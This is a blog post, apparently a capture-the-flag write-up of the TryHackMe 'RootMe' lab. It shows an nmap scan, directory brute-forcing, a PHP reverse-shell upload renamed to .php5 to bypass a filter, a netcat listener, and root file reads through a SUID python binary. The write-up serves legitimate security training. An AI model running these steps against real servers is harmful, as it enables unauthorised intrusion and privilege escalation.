---
layout: post
title: THM Rootme wrriteup
date: 2020-08-01T12:25:26.802Z
---
## TASK 2

1. start a nmap scan 

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-09 23:03 BST
Nmap scan report for 10.10.132.201
Host is up (0.60s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.62 seconds
```

the ports open are : 2

2. apache version is here `Apache httpd 2.4.29 ((Ubuntu))` so 2.4.29
3. service on port 22 is ssh
4. start a directory bruteforce tool, i used [dirsearch.py](https://github.com/maurosoria/dirsearch)
5. the hidden directories : 
6.

```bash
[11:27:22] 301 -  312B  - /css  ->  http://10.10.179.137/css/
[11:27:35] 200 -  616B  - /index.php
[11:27:35] 200 -  616B  - /index.php/login/
[11:27:36] 301 -  311B  - /js  ->  http://10.10.179.137/js/
[11:27:49] 301 -  314B  - /panel  ->  http://10.10.179.137/panel/
[11:27:49] 200 -  732B  - /panel/
[11:27:57] 403 -  278B  - /server-status
[11:27:57] 403 -  278B  - /server-status/
[11:28:06] 301 -  316B  - /uploads  ->  http://10.10.179.137/uploads/
[11:28:06] 200 -744B  - /uploads/
```

the hidden directory is /panel/ and the interesting one is uploads

# Task 3

1. download a php reverse shell from [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), change the LHOST and the port

```bash
wget "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
```

then rename it to bypass file upload restrictions into .php5

```bash
mv php-reverse-shell.php rev.php5
```

then upload it and start a netcat listener

```bash
nc -lvnp LPORT
```

and now open the rev shell from your browser by visiting http://$IP/uploads/rev.php5

and now you should have a reverse shell

to stabilize your shell run :

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

and

```bash
python -c 'import os; os.system("/bin/bash")'
```

now get user.txt

```bash
cat /var/www/user.txt
THM{********************}
```

# Task 4 priv esc

1. after running

```bash
find / -user root -perm /4000
```

you'll see in the list also python that can be used to read files with higher permissions

answer : /usr/bin/python

3. get the root flag by simply running

```bash
python -c 'print(open("/root/root.txt").read())'
```